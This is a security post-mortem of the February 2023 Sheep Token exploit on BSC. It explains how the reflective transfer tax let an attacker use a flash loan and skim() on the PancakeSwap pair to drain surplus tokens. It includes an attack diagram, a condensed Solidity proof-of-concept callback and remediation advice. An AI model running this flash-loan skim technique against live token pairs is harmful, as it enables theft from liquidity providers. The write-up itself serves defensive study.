# Sheep Token — Reflective Token skim Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2023-02-13 |
| **Protocol** | Sheep Token |
| **Chain** | BSC |
| **Loss** | Unknown |
| **Attacker** | Unknown |
| **Attack Tx** | BSC Transaction |
| **Vulnerable Contract** | Sheep Token Contract |
| **Root Cause** | Exploitation of LP pair balance imbalance caused by reflective tax mechanism |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-02/Sheep_exp.sol) |

---
## 1. Vulnerability Overview

Sheep Token is a BSC-based reflective BEP-20 token that collects a tax on each transfer and distributes it to holders. When this tax mechanism interacts with UniswapV2-compatible LP pairs, it creates an imbalance between the actual balance and the reserve, enabling an attacker to withdraw the surplus via `skim()`.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Sheep reflective token pattern (same as BEVO/FDP)
function _transfer(address sender, address recipient, uint256 amount) internal {
    uint256 fee = amount * _taxFee / 100;
    // ❌ When the tax is distributed via reflection, the LP pair balance increases
    // However, the reserve is not updated
    _reflectFee(fee);  // rTotal modified

    _rOwned[sender] -= rAmount;
    _rOwned[recipient] += rTransferAmount;
    // ❌ LP pair's rOwned is unchanged, but the actual balance increases due to ratio change
}

// ✅ Fix
function _reflectFee(uint256 rFee, uint256 tFee) private {
    _rTotal -= rFee;
    _tFeeTotal += tFee;
    // ✅ Added LP pair sync() call
    if (address(pancakePair) != address(0)) {
        IPancakePair(pancakePair).sync();
    }
}
```

### On-Chain Source Code

Source: Bytecode decompilation

```solidity
// Root cause: Exploitation of LP pair balance imbalance caused by reflective tax mechanism
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─1─▶ PancakeSwap Flash Loan (borrow WBNB)
  │
  ├─2─▶ Swap WBNB → Sheep
  │       Tax incurred → rTotal decreases → LP balance increases
  │       LP actual balance > reserve (imbalance)
  │
  ├─3─▶ Sheep-WBNB LP.skim(attacker)
  │       Withdraw excess Sheep or WBNB
  │
  ├─4─▶ Withdrawn Sheep → swap back to WBNB
  │
  └─5─▶ Repay flash loan → net profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
function pancakeCall(address, uint256, uint256, bytes calldata) external {
    // 1. Buy Sheep with flash loan WBNB
    swapWBNBtoSheep(wbnbAmount);

    // 2. Exploit LP imbalance caused by tax
    sheepWbnbPair.skim(address(this));  // Withdraw excess Sheep

    // 3. Swap withdrawn Sheep → WBNB
    swapSheeptoWBNB(sheep.balanceOf(address(this)));

    // 4. Repay flash loan + fee
    wbnb.transfer(address(sheepWbnbPair), flashAmount + fee);
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Reflective token mechanism flaw |
| **Attack Vector** | Flash Loan + tax reflection + skim() |
| **Impact Scope** | LP liquidity providers |
| **DASP Classification** | Business Logic Flaw |
| **CWE** | CWE-682: Incorrect Calculation |

## 6. Remediation Recommendations

1. **Force sync() after tax**: Call LP sync inside `_reflectFee()` or `_transfer()`.
2. **Disable skim()**: Block the skim function on the LP pair if not required by the protocol.
3. **Security audit**: Before deploying a reflective token, thoroughly test all interaction scenarios with AMMs.

## 7. Lessons Learned

- Despite the same pattern recurring across BEVO, BRA, FDP, and Sheep, new tokens continue to make the identical mistake.
- Copy-pasting reflective token boilerplate code carries this vulnerability along with it.
- At a minimum, reviewing the BEVO/SHOCO incidents before deploying a token is essential.